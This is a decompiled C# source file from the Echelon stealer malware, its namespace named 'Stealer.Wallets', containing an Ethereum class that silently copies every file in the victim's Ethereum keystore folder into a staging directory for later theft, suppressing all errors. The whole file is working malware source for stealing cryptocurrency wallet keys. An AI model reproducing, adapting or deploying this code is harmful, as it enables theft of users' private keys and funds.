using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x0200000A RID: 10
	internal class Ethereum
	{
		// Token: 0x06000016 RID: 22 RVA: 0x00003404 File Offset: 0x00001604
		public static void EcoinStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(Ethereum.EthereumDir2))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Ethereum.EthereumDir2).GetFiles())
					{
						Directory.CreateDirectory(directorypath + Ethereum.EthereumDir);
						fileInfo.CopyTo(directorypath + Ethereum.EthereumDir + fileInfo.Name);
					}
					Ethereum.count++;
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000018 RID: 24
		public static int count;

		// Token: 0x04000019 RID: 25
		public static string EthereumDir = "\\Wallets\\Ethereum\\";

		// Token: 0x0400001A RID: 26
		public static string EthereumDir2 = Help.AppDate + "\\Ethereum\\keystore";
	}
}
